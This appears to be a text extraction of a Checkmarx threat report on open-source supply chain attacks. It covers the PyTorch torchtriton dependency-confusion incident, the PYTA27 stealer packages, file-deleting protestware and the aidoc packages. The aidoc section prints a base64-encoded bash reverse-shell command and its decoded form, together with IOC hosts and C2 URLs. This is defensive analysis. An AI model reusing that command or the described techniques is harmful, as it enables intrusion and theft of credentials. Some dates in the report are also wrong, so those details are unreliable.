@@ -1,0 +1,726 @@
+=== SOFTWARE SUPPLY CHAIN SECURITY THREAT LANDSCAPE .pdf ===
+
+--- Página 1 ---
+SOFTWARE SUPPLY CHAIN SECURITY
+THREAT LANDSCAPE
+J a n u a r y  2 0 2 3  O V E R V I E W
+Checkmarx © 2023 All rights reserved.
+
+--- Página 2 ---
+Checkmarx © 2023 All rights reserved.
+The start of the year brought multiple security threats to the open-
+source community, as the widely-used Pytorch ML framework was 
+infected with a malicious dependency, the continued threat from the 
+persistent attacker "PYTA27" releasing new and evolving malicious 
+packages, and the growing issue of Protestware causing disruptions 
+within the community. Adding to the concern was the discovery of 
+malicious code in well-known GitHub projects. All this and more, 
+highlight the need for ongoing vigilance in maintaining the integrity 
+of open-source software.
+Pytorch, a Leading ML Framework was Poisoned with Malicious 
+Dependency
+During a five-day period, the nightly version of PyTorch, a widely used 
+machine learning framework, was compromised in a supply chain 
+attack. The infected version contained a malicious dependency that 
+used the "dependency confusion" technique to target PyTorch Linux 
+users with a C++ malware designed to exfiltrate sensitive information 
+to a specified domain through encrypted DNS queries.
+Threat Actor “PYTA27” Evolves – Enhancing Their Techniques in 
+Recent Supply Chain Attacks
+PYTA27, a persistent attacker, was first detected publishing packages 
+with a copy of the "WASP" stealer malware. The attacker has since 
+continued to release new malicious packages using evolving 
+techniques to conceal the code and evade security measures.
+Growing Concern of Protestware as it Continues to Shake the 
+Open Source Ecosystem
+Asolytics is an open-source tool for App Store Optimization (ASO) that 
+provides features like keyword popularity, app search result tracking, 
+keyword monitoring, and competitor analysis. The tool, however, 
+sparked controversy after it was discovered that it includes code that 
+replaces "Russia" with "Russian Terrorist State." This highlights the 
+danger of mixing politics with open-source development and the 
+potential harm to the trust and cohesion among users and 
+contributors in the open-source community
+
+--- Página 3 ---
+Popular GitHub Project Contains Malicious Code that Deletes 
+Critical Files
+Malicious npm packages detected deleting files on the victim’s 
+machine in case there was an unauthorized usage of the author’s 
+code
+From Detection to Confrontation: Unmasking a Software 
+Supply Chain Attacker
+A PyPi user account, named "aidoc," was discovered publishing 
+malicious packages containing code that opens a remote shell on 
+the victim's machine and establishes persistence by adding the 
+harmful command to the ".bashrc" and ".zshrc" files. Josef Harush 
+conducted a proactive test on a virtual machine and was able to 
+interact with the attacker through a Python script.
+Checkmarx © 2023 All rights reserved.
+
+--- Página 4 ---
+Checkmarx © 2023 All rights reserved.
+Pytorch, a Leading ML 
+Framework was Poisoned with 
+Malicious Dependency
+
+--- Página 5 ---
+Pytorch, a Leading ML Framework was Poisoned with Malicious Dependency 
+TLP: White | January 2023 | supplychainsecurity@checkmarx.com | Twitter: @Cx_SCS 
+ 
+KEY FINDINGS 
+• 
+Between the 25th and the 30th of December 2022, the nightly version of PyTorch, was 
+compromised, effecting potentially thousands of machines. 
+• 
+Only Linux systems were impacted by this attack 
+• 
+Both "Dependency Confusion" and Starjacking attack techniques were used in this incident 
+• 
+Once the infected version was downloaded and the malicious code executed, it attempted 
+to exfiltrate sensitive information including credentials, ssh keys, lists of files, and more, to a 
+specified domain through encrypted DNS queries. 
+• 
+This was the first recording of a significant dependency confusion attack on the PyPi registry. 
+ 
+EXECUTIVE SUMMARY 
+On the 31st of September 2022, Pytorch reported they had been targeted in a software supply chain 
+attack. During a five-day period, the nightly version of PyTorch, a widely-used machine learning 
+framework, was compromised in a supply chain attack. The infected version contained a malicious 
+dependency that used the "dependency confusion" technique to target PyTorch Linux users with a 
+C++ malware designed specifically for Linux systems. This malware collected system information, 
+accessed sensitive files, and sent the information and file contents to a specified domain through 
+encrypted DNS queries. It is likely that thousands of machines were affected by this attack. 
+ 
+Technical Analysis 
+About PyTorch 
+PyTorch is a popular open-source machine learning library for Python, with total of ~180 million 
+downloads. It provides a wide range of tools for training and deploying machine learning models, 
+and is particularly well-suited for deep learning. 
+ 
+How PyTorch is Building Releases 
+To build PyTorch nightly, as part of its source code there are also Python scripts dedicated to 
+building and packaging the project. Some of its dependencies hosted on the project’s self-hosted 
+server available on address https://download.pytorch.org/whl/ 
+Since the projects is having both other 3rd party dependencies such as jinja2, there’s a hybrid fetch 
+flow to first attempt to grab the package from PyPi and if its failing attempt to fetch it from 
+https://download.pytorch.org/whl/ .
+
+--- Página 6 ---
+Pytorch, a Leading ML Framework was Poisoned with Malicious Dependency 
+TLP: White | January 2023 | supplychainsecurity@checkmarx.com | Twitter: @Cx_SCS 
+ 
+ 
+ 
+Dependency Confusion Technique 
+This attack uses the dependency confusion technique on the PyPi ecosystem. Dependency confusion 
+attacks were first revealed by Alex Birsan in 2021. Since then, the technique was used countless of 
+times in both PyPi and NPM package registries. 
+Python packages which are vulnerable to this technique pulls dependencies packages from locations 
+that are not the PyPi registry. Attackers using this technique are publishing to PyPi malicious 
+packages with carefully crafted names in an attempt to make the package manager pull the 
+malicious dependency from PyPi instead of the original dependency. 
+In this current incident, the attacker took advantage of the fact that Pytorch consuming several 
+dependency packages from a dedicated package index and the fact that the package manager “pip” 
+prioritizes the PyPi package index above other indices. 
+Understanding this mechanism, the attack published to the PyPi index a malicious package with a 
+name identical to one of Pytorch’s dependency the are usually pulled from the dedicated index. this 
+malicious package retains all the original package’s functionality so users will not notice the swap 
+and will not experience any difficulties. To the intended functionalities, the attacker added their own 
+malicious ones. 
+ 
+“torchtriton” PyPi Package 
+On 26 December 2022, “torchtriton” package version 2.0.0 was published to the PyPi registry. In an 
+effort to make the package look more reliable, the attacker also used the StarJacking technique 
+linking the package to the popular GitHub repository of the original package 
+This package is an exact replica of the original “torchtriton” project with the exception of two 
+differences: 
+1. The malicious “triton” binary located in the “runtime” directory of the package 
+2. Several lines in python that were added to the existing “__init__.py” directory. These line 
+role is to execute the malicious binary.
+
+--- Página 7 ---
+Pytorch, a Leading ML Framework was Poisoned with Malicious Dependency 
+TLP: White | January 2023 | supplychainsecurity@checkmarx.com | Twitter: @Cx_SCS 
+ 
+ 
+The “./triton/runtime/triton” executable inside is an ELF, written in C++, targeted to X64 Linux 
+systems. Its main purpose is to collect the following system information: nameservers from 
+/etc/resolv.conf, hostname from gethostname(), current username from getlogin(), current working 
+directory name from getcwd(), and environment variables. It also reads the following files: 
+/etc/hosts, /etc/passwd, the first 1,000 files in $HOME/, $HOME/.gitconfig, and $HOME/.ssh/. All of 
+this information, including the contents of the files, is then uploaded via encrypted DNS queries to 
+the domain *.h4ck[.]cfd, using the DNS server wheezy[.]io. 
+ 
+Fast Mitigation 
+The PyTorch maintainers took steps towards mitigating the issue as they replaced the dependency 
+with a different package called "pytorch-triton" and creating a dummy package on PyPI. In addition, 
+all nightly packages that depended on "torchtriton" were removed from the package indices at the 
+PyTorch download website until further notice.
+
+--- Página 8 ---
+Pytorch, a Leading ML Framework was Poisoned with Malicious Dependency 
+TLP: White | January 2023 | supplychainsecurity@checkmarx.com | Twitter: @Cx_SCS 
+ 
+ 
+Impact 
+This is the first time we see a significant dependency confusion attack on the PyPi registry. According 
+to pepy.tech, the “torch” packages (the name used to install Pytorch) has close to 180 million 
+downloads and is one of the two leading ML framework. The nightly versions of framework such as 
+this are published with additional features and usually consumed by advanced users. The 
+“torchtriton” malicious package itself has around 2.8 thousand downloads. 
+This attack is aimed at Linux users and involves a malicious binary file in ELF format. At the time of 
+publication, the file had not been detected by any AV vendor on VirusTotal.
+
+--- Página 9 ---
+Pytorch, a Leading ML Framework was Poisoned with Malicious Dependency 
+TLP: White | January 2023 | supplychainsecurity@checkmarx.com | Twitter: @Cx_SCS 
+ 
+ 
+Attacker’s disclaimers 
+There are indications that the individual responsible for the attack may be a security researcher. This 
+includes a message left by the attacker on the domain where the malware sends collected data, the 
+domain name itself (h4ck[.]cfd), and a disclaimer included in version 3.0.0 of the malicious software 
+stating that it was only created to “discover dependency confusion vulnerabilities.”
+
+--- Página 10 ---
+Pytorch, a Leading ML Framework was Poisoned with Malicious Dependency 
+TLP: White | January 2023 | supplychainsecurity@checkmarx.com | Twitter: @Cx_SCS 
+ 
+As we discussed in a previous blogpost, despite any messages or disclaimers that may have been 
+included, it is clear that the package in question is malicious. Exfiltrating environment variables and 
+SSH keys from infected machines is not acceptable behavior for a security researcher. Simply 
+claiming to be a security researcher does not give someone permission to engage in malicious 
+activity. 
+ 
+Timeline 
+- 
+17 December 2022 – PyPi user account pytorch-experimental created 
+- 
+17 December 2022 – Version 0.1.0 of PyPi package torchtriton published 
+- 
+26 December 2022 - Version 2.0.0 of PyPi package torchtriton published 
+- 
+30 December 2022 - Version 3.0.0 of PyPi package torchtriton published 
+- 
+30 December 2022 – PyTorch introduced a commit and published the  
+- 
+31 December 2022 – PyTorch published they was compromised by a supply chain attack 
+ 
+Conclusion 
+This assault serves as more evidence that cybercriminals have been concentrating their efforts on 
+the open-source package ecosystem. According to our predictions, this trend will only gain 
+momentum in 2023, requiring developers and businesses to implement the necessary security 
+measures. 
+Since threat actors are ever-evolving and use novel and unexpected tactics, combating them 
+continues to be a formidable challenge. These individuals aim to contaminate our software supply 
+chain ecosystem. 
+In order to defend the open-source ecosystem against these risks, it is essential to speed up 
+information flow on these assaults among all stakeholders involved (package registries, security 
+researchers, and developers). By collaborating, we can stay ahead of attackers and fight against 
+software supply chain attacks. 
+ 
+IOC 
+• 
+wheezy[.]io 
+• 
+h4ck[.]cfd 
+• 
+2385b29489cd9e35f92c072780f903ae2e517ed422eae67246ae50a5cc738a0e 
+• 
+9c89731a94dd4f2a594a22c1b171cb6c20f55e41
+
+--- Página 11 ---
+Checkmarx © 2023 All rights reserved.
+Threat Actor “PYTA27” 
+Evolves – Enhancing Their 
+Techniques In Recent 
+Supply Chain Attacks
+
+--- Página 12 ---
+Threat Actor “PYTA27” Evolves – Enhancing Their Techniques In Recent Supply Chain Attacks 
+TLP: White | January 2023 | supplychainsecurity@checkmarx.com | Twitter: @Cx_SCS 
+ 
+KEY FINDINGS 
+• 
+The threat actor “PYTA27” has been utilizing W4SP-type malware in their packages for over 
+four months. 
+• 
+PYTA27 has continually improved their methods of disguising the malicious code, making it 
+increasingly difficult to detect the payload over time. 
+• 
+We see a growing number of attackers copying W4SPs concept and adding their custom 
+improvements.  
+• 
+Using open source malware will accelerate the number of attacks to compromise software 
+dependencies. 
+EXECUTIVE SUMMARY 
+As we observe the evolution of attackers, it is clear that they are constantly improving their 
+methods. One such attacker, named PYTA27, who has been active for over four months and 
+counting, has been distributing malicious packages using various techniques to make detecting and 
+removing of their malware more challenging. Studying how attackers adapt and improve their 
+methods over time is a valuable tool for security professionals. The fact that this particular attacker 
+has been active for a significant amount of time and has demonstrated a willingness to change 
+tactics suggests that the risk for users is ongoing and that the effort required for the attacker is 
+minimal. This provides a unique opportunity for security professionals to learn from this attacker's 
+tactics and improve their own defenses. 
+Technical Analysis 
+Threat Actor PYTA27 
+A few weeks ago, the original GitHub repository of W4SP Stealer was removed by GitHub staff. For 
+those of you who are not familiar, W4SP Stealer is an open-source malware that aims to steal all the 
+victim's Discord accounts, passwords, crypto wallets, credit cards, and other valuable files on their 
+PC and sends them to the attacker via a pre-set Discord webhook address.
+
+--- Página 13 ---
+Threat Actor “PYTA27” Evolves – Enhancing Their Techniques In Recent Supply Chain Attacks 
+TLP: White | January 2023 | supplychainsecurity@checkmarx.com | Twitter: @Cx_SCS 
+ 
+ 
+Since then, countless copycats of the same concept have emerged, calling themselves by different 
+names such as ANGEL Stealer, Celestial Stealer, Leaf $tealer, Zay injection, and more.    
+We dubbed one of those threat actors PYTA27 and this is the story of their evolution over time. 
+ 
+Plain Text 
+We first observed PYTA27 activity on the 11th of September with the appearance of four packages 
+published at the same hour by the user account "diazz” all with the description "Discord Code."
+
+--- Página 14 ---
+Threat Actor “PYTA27” Evolves – Enhancing Their Techniques In Recent Supply Chain Attacks 
+TLP: White | January 2023 | supplychainsecurity@checkmarx.com | Twitter: @Cx_SCS 
+ 
+Three of the packages were empty, but one of them contained clear text code for a copycat of the 
+"wasp" malware called "zay injection." 
+ 
+From the “colorcolorfull” package 
+Since then, in each batch of packages, PYTA27 has attempted to use different techniques to conceal 
+the malicious code and make it more difficult to identify the payload. 
+Using Obfuscation 
+On September 12th, 2022, PYTA27 uploaded the package "color-vividpy," which used the 
+Pyobfuscate obfuscator. (Code obfuscation with this tool can easily be deobfuscated following the 
+steps in this blog).
+
+--- Página 15 ---
+Threat Actor “PYTA27” Evolves – Enhancing Their Techniques In Recent Supply Chain Attacks 
+TLP: White | January 2023 | supplychainsecurity@checkmarx.com | Twitter: @Cx_SCS 
+ 
+ 
+The following four packages that they uploaded targeted Discord. In two of them, the attacker used 
+the Hyperion obfuscator (originally used in the W4SP Stealer). On another package, the Python 
+obfuscation tool by development-tools.net is used. BTW this brought up old memories with the 
+usage of an obfuscator incorporating words such as “love,” “magic,” “joy,” etc. This kind of 
+obfuscation was common in obfuscated code over a year ago, but we have seen fewer attackers 
+using it in recent months. 
+ 
+From the”pyselfdiscord” package 
+Hiding Malicious code at the bottom 
+Another technique is adding legitimate code before the malicious part, making it difficult to identify 
+at first. They continued to use double obfuscation and added more data to further conceal the
+
+--- Página 16 ---
+Threat Actor “PYTA27” Evolves – Enhancing Their Techniques In Recent Supply Chain Attacks 
+TLP: White | January 2023 | supplychainsecurity@checkmarx.com | Twitter: @Cx_SCS 
+ 
+malware. (Such as in the "discord-py-v13" package). In all their recent packages, they targeted 
+Discord users by using package names and descriptions such as "Used in Discord tools to have great 
+natural functionality without errors and interruptions!" 
+ 
+ 
+From the “discord-py-v13" 
+November 2022 – Using a Second Stage 
+After that, PYTA27 took a break for about a month and a half and resumed their attack on November 
+1st by uploading new packages under a different username (laurenjackson) but with the same 
+description as before. 
+In another change of their techniques, they added a snippet that downloads a second stage code 
+from a remote location (hxxps://www.klgrth[.]io/paste/j2yvv/raw), saves it to a random path with a 
+random name and runs it.
+
+--- Página 17 ---
+Threat Actor “PYTA27” Evolves – Enhancing Their Techniques In Recent Supply Chain Attacks 
+TLP: White | January 2023 | supplychainsecurity@checkmarx.com | Twitter: @Cx_SCS 
+ 
+ 
+From the “joinerutil" package 
+The downloaded obfuscated code was the stealer. In some of the packages, the attacker 
+incorporated a persistence mechanism by adding a “SecurityHealthSystray.exe" key in the “run” 
+directory in the registry to trigger the payload on startup. This, along with the fact that the code uses 
+Windows local path and the python libraries “winreg”, and “wmi” suggests that the code only runs 
+on Windows machines.  
+At this point, the attacker opened the "ch4zzin" user account and uploaded additional malicious 
+packages, this time changing the final payload and using two new types of stealers: "Leaf $tealer" 
+and "Celestial Stealer." 
+ 
+ 
+Adding registry key
+
+--- Página 18 ---
+Threat Actor “PYTA27” Evolves – Enhancing Their Techniques In Recent Supply Chain Attacks 
+TLP: White | January 2023 | supplychainsecurity@checkmarx.com | Twitter: @Cx_SCS 
+ 
+The Leaf $tealer 
+The "Leaf $tealer" can be found on a GitHub repository and describe itself as follow: 
+“A thief of discord accounts and Bitcoin wallets (Captures other logins from sites including steam, 
+PayPal, sellix, and several other sites) after running once it is injected into the victim's computer, 
+always receiving new information after a reboot (Undetectable antivirus).” 
+The creator, "diniz," has only created one repository that they continuously update. Inside the 
+"injection.py" file, you can find a simple Python script that steals credentials from the victim’s 
+machine and installs several dependencies. What's notable is that “diniz” keeps changing the last 
+dependency, so if the package gets deleted or removed, their replacement package will be a 
+dependency for the project, so it will automatically download it. In the example shown, the 
+malicious packages are "realtek" and “coincounter,” but earlier that day, it was changed to a new 
+malicious package, "movers". 
+ 
+ 
+Changing packages names 
+ 
+If you look at the second file in that repository, "module.bat", you can see that it also contains the 
+same malicious packages (including one that was removed a long time ago - wniutil).
+
+--- Página 19 ---
+Threat Actor “PYTA27” Evolves – Enhancing Their Techniques In Recent Supply Chain Attacks 
+TLP: White | January 2023 | supplychainsecurity@checkmarx.com | Twitter: @Cx_SCS 
+ 
+ 
+Keeping the removed pakcage - wniutil 
+They also maintain an active Discord channel that they update whenever they make changes to the 
+repository. The discord channel was created in December and was deleted on 18.1.22 by discord due 
+to a TOS violation.
+
+--- Página 20 ---
+Threat Actor “PYTA27” Evolves – Enhancing Their Techniques In Recent Supply Chain Attacks 
+TLP: White | January 2023 | supplychainsecurity@checkmarx.com | Twitter: @Cx_SCS 
+Still evolving 
+After another break, the attacker appeared again in December 2022 and, since then, has continued 
+to publish malicious packages with minor adjustments. After returning to their old username, 
+“laurenjackson,” the attacker uploaded packages with a new C2 server and a piece of code ensuring 
+the program would exit in case the host operating system is not Windows.  
+The reason for this addition is that the package is designed to run on Windows only; attempting to 
+install it on different operating systems, such as Linux, will result in errors.  
+These days, the C2 server they use is a simple GitHub page 
+(https://raw.githubusercontent.com/IvanDevGames/index.js/main/1337.py) that keeps on changing 
+whenever a new package is uploaded. 
+TTP Evolution 
+PYTA27 has been evolving their tactics over time, starting with plain text code, then using 
+obfuscation tools such as Pyobfuscate and Hyperion, and finally hiding the malicious code at the 
+bottom of legitimate code. 
+Another significant aspect to note about PYTA27 is their persistence. This attacker has been active 
+for at least four months and has not shown any signs of stopping, which highlights the ongoing risk 
+for users. Additionally, PYTA27's willingness to change tactics and use different techniques, such as 
+different obfuscation tools, shows that they are actively trying to evade detection. This is why it is 
+essential for security professionals to stay informed about the latest tactics and techniques used by 
+threat actors like PYTA27. They should also continuously update their defenses accordingly. This 
+includes not only technical measures but also educating users to be more cautious about 
+downloading and using open-source packages from untrusted sources.
+
+--- Página 21 ---
+Threat Actor “PYTA27” Evolves – Enhancing Their Techniques In Recent Supply Chain Attacks 
+TLP: White | January 2023 | supplychainsecurity@checkmarx.com | Twitter: @Cx_SCS 
+ 
+ 
+Conclusion 
+This report highlights the ongoing threat of malware distribution and the need for constant vigilance 
+and adaptation to protect against it. The attacker “PYTA27,” who was mentioned in the report, has 
+shown a willingness to adapt and improve their methods over time, making detecting and removing 
+malware more difficult. This serves as a reminder that security professionals must stay informed and 
+aware of new techniques and methods to effectively protect against these types of attacks. It also 
+shows the importance of open-source intelligence and information sharing among security 
+professionals to stay ahead of attackers. The use of code obfuscation, multiple usernames, and 
+different packages is a common technique used by attackers, and security professionals should 
+always be cautious when downloading packages from untrusted sources. 
+Persistent threat actors operating in the open-source code ecosystem are experimenting and 
+launching attacks on version control systems, mainly GitHub and package registries such as PyPi and 
+NPM. Checkmarx SCS team is continuously tracking these actors to be able to keep its customers 
+safe and mitigate attacks quickly after they appear. 
+The low risk and ease of launching such attacks ensure that existing attackers will continue their 
+activities while more newcomers will start experimenting as and attacking well. 
+ 
+Packages 
+The full list of packages can be found at the following link: 
+- 
+https://gist.github.com/TalFo/f98416d87ca761d79caf0fc9c57315e7 
+ 
+IOC 
+The full list of IOC can be found at the following link: 
+- 
+https://gist.github.com/TalFo/2649fffd635166336ac7d0291040a23e
+
+--- Página 22 ---
+Checkmarx © 2023 All rights reserved.
+Popular GitHub Project 
+Contains Malicious Code that 
+Deletes Critical Files
+
+--- Página 23 ---
+Popular GitHub Project Contains Malicious Code that Deletes Critical Files 
+TLP: White | January 2023 | supplychainsecurity@checkmarx.com | Twitter: @Cx_SCS 
+ 
+KEY FINDINGS 
+• 
+On January 10th, nine malicious packages from the Pypi user “chuzhixin”, were detected.   
+• 
+The Malicious code was designed to delete files on the victim’s machine if there was any 
+unauthorized usage of the author’s projects. 
+• 
+The author of the malicious code used techniques such as obfuscation, randomly generated 
+variables and function names, and code written in a compact form, to complicate the 
+understanding of the code. 
+EXECUTIVE SUMMARY 
+On January 10, 2023, The Mend research team discovered a new type of malicious code that 
+attackers can use to exploit legitimate security and license concerns. The code was designed to 
+prevent people from using unlicensed software, specifically in this case, by deleting files on the 
+victim’s machine if there was any unauthorized usage of the author’s code. In addition to Mend’s 
+report, the Checkmarx supply chain security team were able to uncover additional details, including 
+more malicious packages. It seems that the author, “chuzhixin”, had no intention of harming random 
+developers, but rather, their aim was to deter thieves from using their paid versions of their open 
+website templates. 
+Technical Analysis 
+Background 
+As reported by Mend, the NPM user account jayxuz published the package @jayxuz/rely , including 
+malicious code deleting the victim’s project files. 
+Our team found additional malicious packages published by jayxuz, and we found it is related to the 
+GitHub user account chuzhixin which is the owner of the highly popular chuzhixin/vue-admin-better 
+project. 
+The chuzhixin/vue-admin-better GitHub project, starred by over 13k users, offers an admin panel 
+project template built on top of the popular frontend framework vuejs with multiple sub-
+components and eye-candy widgets. 
+ 
+Paid Version 
+In addition to the open source version on GitHub, the makers of this successful project offer a paid 
+version of the admin panel template with more features. This version is sold on the dedicated 
+website https://vue-admin-beautiful.com/.
+
+--- Página 24 ---
+Popular GitHub Project Contains Malicious Code that Deletes Critical Files 
+TLP: White | January 2023 | supplychainsecurity@checkmarx.com | Twitter: @Cx_SCS 
+ 
+ 
+vue3-admin-icons malicious code 
+Analyzing the npm package @jayxuz/vue3-admin-icons revealed hidden code intended to disrupt 
+web applications using a stolen version of the template hosted outside of the allow-list of sites. One 
+of the allowed websites is https://vue-admin-beautiful.com/ 
+ 
+Public Statement 
+The GitHub user account chuzhixin posted a public statement with an explanation regarding why he 
+posted those malicious packages. 
+BTW it was originally written in Chinese, and we used Google Translate. The translation might be 
+slightly inaccurate. 
+They say it was done because “one of our paid users open sourced our paid products to github a few 
+years ago”. They continue explaining how it damaged their profits and explained that they just want 
+to “retaliate against those who sold it at a low price”
+
+--- Página 25 ---
+Popular GitHub Project Contains Malicious Code that Deletes Critical Files 
+TLP: White | January 2023 | supplychainsecurity@checkmarx.com | Twitter: @Cx_SCS 
+ 
+ 
+Conclusion 
+Since threat actors are ever-evolving and use novel and unexpected tactics, combating them 
+continues to be a formidable challenge. These individuals aim to contaminate our software supply 
+chain ecosystem. 
+In order to defend the open-source ecosystem against these risks, it is essential to speed up 
+information flow on these assaults among all stakeholders involved (package registries, security 
+researchers, and developers). By collaborating, we can stay ahead of attackers and fight against 
+software supply chain attacks.
+
+--- Página 26 ---
+Checkmarx © 2023 All rights reserved.
+From Detection to 
+Confrontation: Unmasking a 
+Software Supply Chain Attacker
+
+--- Página 27 ---
+From Detection to Confrontation: Unmasking a Software Supply Chain Attacker 
+TLP: White | January 2023 | supplychainsecurity@checkmarx.com | Twitter: @Cx_SCS 
+ 
+KEY FINDINGS 
+• 
+A PyPi user account, aidoc, was found to have been publishing malicious packages 
+• 
+The malicious code in the packages opens a remote shell on the victim’s machine and uses a 
+simple persistence mechanism by appending the malicious command to the “.bashrc” and 
+“.zshrc” files. 
+• 
+Jossef Harush, Head of SCS Engineering in Checkmarx, conducted a proactive experiment on a 
+virtual machine and was able to interact with the attacker via a Python script. 
+EXECUTIVE SUMMARY 
+Checkmarx SCS team uncovered malicious packages trying to impersonate a medical company. The 
+malicious packages contained a payload that opened a remote shell and used a simple mechanism to 
+gain persistence on the victim’s machine. We then attempted to contact the attacker to understand the 
+intentions behind the act. 
+Details 
+Over the past few years, the SCS team’s mission has been to fight software supply chain hackers who 
+attack developers and users through open-source code. Our goal is to detect as soon as possible and 
+report the relevant security teams to jam their operations. 
+To support our mission, the team created an automated package analysis pipeline, which scans new 
+packages as soon as they are uploaded to the open-source ecosystem. 
+One of our engines is called “Watchdog”. This engine is aware of known-as-bad user accounts which 
+previously published malicious packages. This engine brings useful context when such user accounts 
+make new contributions and out of the many user accounts in our “naughty list”, one PyPi user account 
+aidoc (first seen in August 2022) pops up again out of nowhere and starts dropping more of the same.  
+ 
+ 
+activity over time of PyPi user account aidoc first seen in August 2022
+
+--- Página 28 ---
+From Detection to Confrontation: Unmasking a Software Supply Chain Attacker 
+TLP: White | January 2023 | supplychainsecurity@checkmarx.com | Twitter: @Cx_SCS 
+ 
+ 
+In addition, another engine the team integrated into our analysis pipeline is called “Groot”, a dynamic 
+analysis engine (sandbox). The purpose of this engine is to thoroughly detonate and analyze open-
+source packages by installing, importing, and using SAST tools to invoke functionality within. 
+This engine results in a full audit of the package’s behavior, including any files created, subprocesses 
+launched, network communications (including TLS traffic), and other useful insights.
+ 
+screenshot from Groot (our dynamic analysis engine) results — audited the behavior of the malicious package 
+What’s Inside the Package? 
+Upon receiving a prioritized signal from our analysis pipeline, Jossef manually inspected the newly 
+published packages.
+
+--- Página 29 ---
+From Detection to Confrontation: Unmasking a Software Supply Chain Attacker 
+TLP: White | January 2023 | supplychainsecurity@checkmarx.com | Twitter: @Cx_SCS 
+ 
+ 
+The malicious code is placed in the “setup.py” script and executed upon installation. The attacker used 
+function names referring to users as victims such as identifyVictim() and it appears the purpose is to 
+open a remote shell on the victim’s machine. The attacker tried to hide the command by encoding it as 
+base64
+
+--- Página 30 ---
+From Detection to Confrontation: Unmasking a Software Supply Chain Attacker 
+TLP: White | January 2023 | supplychainsecurity@checkmarx.com | Twitter: @Cx_SCS 
+ 
+base64 -D <<< 
+KGJhc2ggLWMgJzA8JjEwMC07ZXhlYyAxMDA8Pi9kZXYvdGNwLzMuMjIxLjE1Mi4yMDMvNzcxO3NoIDwmM
+TAwID4mMTAwIDI+JjEwMCcgPiAvZGV2L251bGwgMj4mMSAmKQo= | sh 
+which decodes to 
+(bash -c '0<&100-;exec 100<>/dev/tcp/3.221.152.203/771;sh <&100 >&100 2>&100' > 
+/dev/null 2>&1 &) 
+ 
+a simple command to initiate remote shell receiving commands from IP address 3.221.152.203 on port 
+771. In addition, a simple persistence mechanism was used by appending his malicious base64-encoded 
+command to the end of “.bashrc” and “.zshrc” files. 
+  
+Pro-active Experiment 
+Jossef decided to perform a proactive experiment on a virtual machine I created for the task. He started 
+by infecting the virtual machine with one of the malicious packages by running the command:
+
+--- Página 31 ---
+From Detection to Confrontation: Unmasking a Software Supply Chain Attacker 
+TLP: White | January 2023 | supplychainsecurity@checkmarx.com | Twitter: @Cx_SCS 
+ 
+pip install aidoc-e2e-utils 
+ 
+It didn’t take too long before Jossef saw the attacker writing files to disk and reading sensitive files. 
+ 
+screenshot from the pcap file recorded on the virtual machine — attacker sending commands 
+ 
+After letting the attacker play with my virtual machine, Jossef decided to take it to the next level by 
+writing a Python script that connects to the attacker’s C2 server using a raw socket and waits to receive 
+a new command. 
+When such a command is received, the script prompts my confirmation to execute; otherwise, allowing 
+me to type whatever made-up output I decide.
+
+--- Página 32 ---
+From Detection to Confrontation: Unmasking a Software Supply Chain Attacker 
+TLP: White | January 2023 | supplychainsecurity@checkmarx.com | Twitter: @Cx_SCS 
+ 
+ 
+ 
+This is the dialog with the attacker on the other end: 
+attacker: whoami 
+victim: who are you? 
+ 
+attacker: ifconfig 
+victim: 192.168.0.1 
+ 
+attacker: ls ~/
+
+--- Página 33 ---
+From Detection to Confrontation: Unmasking a Software Supply Chain Attacker 
+TLP: White | January 2023 | supplychainsecurity@checkmarx.com | Twitter: @Cx_SCS 
+ 
+victim: yo, lets talk. who are you? 
+ 
+attacker: ls . 
+victim: who are you? 
+ 
+attacker: Security Engineer. You? 
+victim: Are you sure? security engineers don't write reverse shells. 
+ 
+attacker: ls 
+ls 
+ls 
+ifconfig 
+victim: nope. 
+ 
+attacker: ls . 
+victim: Where are you from? 
+ 
+attacker: I am checking Internal systems. Dependency confusion you know. If 
+not our system, I am killing the shell and drop the connection (just dont 
+connect back) See you. 
+In their exchange, the attacker claimed to be a security researcher who was “checking Internal systems. 
+Dependency confusion you know.” and said that “If not our system, I am killing the shell and drop the 
+connection.” 
+He knew this attacker did more than he claims as our dynamic analysis engine observed him dropping 
+new files and executing commands to read sensitive files such as “cat /etc/passwd”. 
+Not to mention that security researchers usually don’t infect other machines with reverse shells and 
+connect interactively. 
+panic_mode: true 
+Shortly after their conversation, Jossef noticed the attacker published new versions to all packages 
+owned by PyPi user account aidoc, omitting the word “victim” and removing the remote shell code, 
+leaving what appears to be a simple beacon to indicate to the server that one of the packages was 
+installed.
+
+--- Página 34 ---
+From Detection to Confrontation: Unmasking a Software Supply Chain Attacker 
+TLP: White | January 2023 | supplychainsecurity@checkmarx.com | Twitter: @Cx_SCS 
+ 
+ 
+Although no “DO NOT RUN” warnings and disclaimers exist, Jossef considered this package more 
+suitable for research purposes. 
+ 
+Code of Conduct 
+Claiming to be a security researcher is not a free pass, if your actions are not in alignment with the 
+standards expected of one. 
+If the person behind this attack is indeed a security engineer, then it seems suspicious to us that they 
+failed to declare their intent and identity as a security professional. Moreover, the reverse shell 
+functionality, as well as other actions described in this blog, are not in alignment with what is expected 
+from a security researcher. 
+Incidents in which actions of individuals claiming to be security professionals caused severe damages, 
+such as the poisoning of the popular “ctx” Python package, raise the topic of a certain “code of 
+conduct” 
+for security researchers in the field of open-source security we recommend reading this story 
+discussing the dos and don’ts when performing malicious package research. 
+ 
+Conclusion 
+Don’t get mistaken, it’s not a malicious package problem. It’s an attacker's problem.
+
+--- Página 35 ---
+From Detection to Confrontation: Unmasking a Software Supply Chain Attacker 
+TLP: White | January 2023 | supplychainsecurity@checkmarx.com | Twitter: @Cx_SCS 
+ 
+Apparently, this threat actor was targeting aidoc.com, which is an Israeli startup in the field of 
+healthcare artificial intelligence. Jossef has reached out to the company’s CISO and executives to inform 
+them that someone might be targeting their organization (as the packages prefixed “aidoc-“ and the 
+user account “aidoc”). 
+In addition, he reported this activity to PyPi’s security team and they removed the malicious packages. 
+The SCS team will continue to monitor the ecosystem for attackers and to continue working together to 
+keep the ecosystem safe. 
+ 
+Packages 
+The full list of packages can be found at the following link: 
+• 
+https://medium.com/checkmarx-security/chat-with-a-software-supply-chain-attacker-
+98749c28f7b 
+ 
+IOCs 
+ 
+• 
+3.129.111.79 
+• 
+3.221.152.203 
+• 
+http://3.221.152.203:8000/acl/package/{getFolderName()}/system/{system}/user/{whoami}
+
